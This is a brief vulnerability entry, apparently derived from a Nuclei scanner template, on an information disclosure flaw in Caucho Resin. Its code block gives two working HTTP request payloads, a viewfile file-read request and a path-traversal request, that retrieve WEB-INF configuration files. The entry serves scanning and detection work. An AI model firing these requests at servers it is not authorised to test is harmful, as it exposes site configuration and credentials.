# Vulnerability: Caucho Resin - Information Disclosure
**Classification:** CWE-200
**Source:** Nuclei Template (`caucho-resin-info-disclosure.yaml`)

## Description
Caucho Resin contains an information disclosure vulnerability. The application does not properly sanitize user-supplied input. An attacker can potentially obtain sensitive information, modify data, and/or execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/resin-doc/viewfile/?file=/WEB-INF/resin-web.xml
GET {{BaseURL}}/%20../web-inf/web.xml
```

